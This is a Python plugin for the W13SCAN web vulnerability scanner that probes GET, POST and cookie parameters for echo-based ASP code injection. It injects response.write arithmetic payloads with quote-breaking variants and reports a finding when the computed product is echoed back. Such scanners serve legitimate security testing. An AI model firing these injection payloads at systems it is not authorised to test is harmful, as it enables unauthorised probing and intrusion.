#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/4 5:11 PM
# @Author  : w8ay
# @File    : command_asp_code.py
import copy
import os
import random

import requests

from api import PluginBase, WEB_PLATFORM, conf, PLACE, HTTPMETHOD, ResultObject, VulType, output, generateResponse
from lib.core.common import paramsCombination


class W13SCAN(PluginBase):
    name = 'ASP代码注入'
    desc = '''暂只支持回显型的ASP代码注入,当level>4时会无视环境识别因素进行fuzz'''

    def audit(self):
        if WEB_PLATFORM.ASP not in self.response.programing and conf.level < 2:
            return

        randint1 = random.randint(10000, 90000)
        randint2 = random.randint(10000, 90000)
        randint3 = randint1 * randint2
        headers = self.requests.headers

        payloads = [
            'response.write({}*{})'.format(randint1, randint2),
            '\'+response.write({}*{})+\''.format(randint1, randint2),
            '"response.write({}*{})+"'.format(randint1, randint2),
        ]
        iterdatas = []
        if self.requests.method == HTTPMETHOD.GET:
            iterdatas.append((self.requests.params, PLACE.GET))
        elif self.requests.method == HTTPMETHOD.POST:
            iterdatas.append((self.requests.post_data, PLACE.POST))
        if conf.level >= 3:
            iterdatas.append((self.requests.cookies, PLACE.COOKIE))

        for item in iterdatas:
            iterdata, positon = item
            for k, v in iterdata.items():
                data = copy.deepcopy(iterdata)
                for payload in payloads:
                    if payload[0] == "r":
                        data[k] = payload
                    else:
                        data[k] = v + payload
                    params = paramsCombination(data, positon)
                    if positon == PLACE.GET:
                        r = requests.get(self.requests.netloc, params=params, headers=headers)
                    elif positon == PLACE.POST:
                        r = requests.post(self.requests.url, data=params, headers=headers)
                    elif positon == PLACE.COOKIE:
                        if self.requests.method == HTTPMETHOD.GET:
                            r = requests.get(self.requests.url, headers=headers, cookies=params)
                        elif self.requests.method == HTTPMETHOD.POST:
                            r = requests.post(self.requests.url, data=self.requests.post_data, headers=headers,
                                              cookies=params)
                    html1 = r.text
                    if str(randint3) in html1:
                        result = ResultObject(self)
                        result.init_info(self.requests.url, "发现asp代码注入", VulType.CMD_INNJECTION)
                        result.add_detail("payload探测", r.reqinfo, generateResponse(r),
                                          "探测payload:{},并发现回显数字{}".format(data[k], randint3), k, data[k], positon)
                        output.success(result)
                        return
